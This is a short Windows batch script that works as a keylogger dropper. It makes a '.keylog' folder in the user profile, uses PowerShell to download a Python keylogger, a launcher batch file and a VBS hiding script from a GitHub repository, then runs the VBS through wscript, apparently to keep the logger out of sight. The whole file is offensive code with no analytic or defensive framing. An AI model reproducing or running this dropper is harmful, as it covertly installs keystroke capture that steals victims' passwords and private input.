@echo off
mkdir %USERPROFILE%\.keylog > NUL
powershell –c "(new-object System.Net.WebClient).DownloadFile('https://github.com/Raikster/keylogger_python/keylogger.py','%USERPROFILE%\.keylog\keylogger.py')"
powershell –c "(new-object System.Net.WebClient).DownloadFile('https://github.com/Raikster/keylogger_python/keylogger_start.bat','%USERPROFILE%\.keylog\keylogger_start.bat')"
powershell –c "(new-object System.Net.WebClient).DownloadFile('https://github.com/Raikster/keylogger_python/testhide.vbs','%USERPROFILE%\.keylog\testhide.vbs')"
wscript //e:vbscript '%USERPROFILE%\.keylog\testhide.vbs'
